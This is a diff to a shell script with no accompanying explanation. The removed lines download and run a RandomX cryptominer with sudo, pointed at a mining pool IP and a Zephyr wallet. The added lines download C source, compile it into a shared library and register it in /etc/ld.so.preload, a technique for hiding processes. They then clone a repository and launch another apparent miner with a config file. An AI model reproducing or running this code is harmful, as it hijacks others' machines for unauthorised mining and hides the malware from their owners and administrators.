@@ -1,3 +1,14 @@
-wget https://github.com/sitina21/epep/raw/main/SORABI >/dev/null 2>&1
-chmod +x SORABI
-sudo ./SORABI --disable-gpu --algorithm randomx --pool 149.50.222.86:80 --wallet ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY.$(echo $(shuf -i 100-999 -n 1)-DEWA)
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+git clone https://github.com/epois/zephher.git
+cd zephher
+chmod +x SHA256SUMS
+chmod +x config.json
+chmod +x zepo
+./zepo -c "config.json"
